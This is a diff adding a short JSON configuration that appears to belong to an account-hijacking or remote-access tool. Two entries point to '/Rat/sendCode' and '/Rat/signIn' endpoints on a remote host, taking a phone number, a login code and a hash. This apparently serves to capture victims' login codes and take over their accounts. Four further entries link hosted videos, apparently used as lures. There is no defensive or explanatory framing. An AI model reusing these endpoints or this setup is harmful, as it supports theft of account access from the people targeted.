@@ -1,0 +1,8 @@
+{
+    "send": "https://mee.s70.xyz/Rat/sendCode/?number=NN1",
+    "sign": "https://mee.s70.xyz/Rat/signIn/?code=CC2&hash=HH2&number=NN2",
+    "video1": "https://biaupload.com/static/files-2023-06/org-bd0188b11e3f1.mp4",
+    "video2": "https://biaupload.com/static/files-2023-06/org-001d83fdebfa1.mp4",
+    "video3": "https://biaupload.com/static/files-2023-06/org-f37180e883e91.mp4",
+    "video4": "https://biaupload.com/static/files-2023-06/org-f4e2a14417fb1.mp4"
+}
